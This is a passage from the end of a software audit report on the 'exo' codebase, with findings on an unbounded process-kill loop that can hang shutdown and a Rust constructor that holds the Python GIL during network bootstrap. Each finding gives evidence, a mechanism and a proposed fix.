**Evidence.** async_process.py:127-131 `finally: with CancelScope(shield=True): await self._terminate_if_still_alive()`; async_process.py:234-243 `while True: process.kill(); with move_on_after(_KILL_GRACE_SECONDS): await self.wait(); j += 1; if self.exitcode is not None or not process.is_alive(): break` with no upper bound. supervisor.py:269-270 awaits `runner_process.stop()` under another shield and Worker.run awaits every supervisor before setting `_stopped` (worker/main.py:119-127), which `_elect_loop` and Node shutdown wait on (main.py:257, 369-371).

**Mechanism.** A runner process stuck in an uninterruptible kernel/Metal call (the failure class the diagnostics module classifies as 'Metal GPU timeout') ignores SIGKILL for as long as the driver holds it. The loop retries every 2 s forever, the shield prevents Ctrl-C from breaking out, `Worker.shutdown` never completes, and an election-driven worker restart (`await self.worker.shutdown()` in `_elect_loop`) or a normal `exo` shutdown hangs indefinitely; the second SIGINT falls through to `sys.exit(1)` from a signal handler, skipping all other cleanup.

**Fix.** Bound the kill loop (e.g. `_KILL_ATTEMPTS = 5`), then log critical, drop the reference (`process.close()` is tolerant) and return so shutdown can proceed and the orphan is reaped by multiprocessing's atexit (`daemon=True`); surface the stuck PID in the RunnerFailed diagnostics so the operator can act.

### F149 — NetworkingHandle.new holds the GIL for the whole zenoh/discovery bootstrap

*`rust/exo_rs/src/networking.rs:88` — low · effort S · finder-reported · lens `rust-transport` · confidence 0.50*

**Evidence.** networking.rs:87-96: `let swarm = pyo3_async_runtimes::tokio::get_runtime().block_on(create_swarm(...)).pyerr()?;` inside a plain `#[staticmethod] pub fn new(...)` with no `py.detach`. create_swarm builds the zenoh runtime, binds the TCP listener, starts the storage plugin, binds the UDP socket and enumerates interfaces (lib.rs:54-103, discovery.rs:40-118). tracing→log bridging is active (Cargo.lock: `tracing` depends on `log`; pyo3_log::init() at exo_rs lib.rs:152) and pyo3-log emits via `Python::attach(|py| ...)` (vendored lib.rs:591-595); logging.py:59 sets the root stdlib level to 0 so every zenoh debug record is enabled.

**Mechanism.** Any zenoh or netwatcher thread that emits a log record while `new` is running blocks on the GIL until construction returns; today nothing awaited inside block_on depends on those threads, so this only delays their startup, but it is a latent deadlock if zenoh's bootstrap ever awaits a logging task, and it freezes other Python threads (loguru's enqueue writer, signal handling) for the entire bootstrap.

**Fix.** Wrap the blocking call: `py.detach(|| get_runtime().block_on(create_swarm(...)))` by adding a `py: Python<'_>` parameter, or expose `new` as an async constructor via `future_into_py`. Consider `pyo3_log::Logger::default().filter_target("zenoh".into(), LevelFilter::Info)` so transport threads rarely need the GIL.

---

Lenses run: `api-compat`, `build-deps`, `concurrency`, `control-plane`, `dashboard`, `dead-code-drift`, `download`, `mlx-engine`, `performance`, `resilience`, `rust-transport`, `security`, `test-gaps`, `worker-runner`.
Not run: `image-engine`, `placement`, `type-discipline`.
Verification: critical and high findings, and the mediums quoted in the ranked list, were re-checked by
opening the cited lines at commit 40f1785. Others are finder-reported.
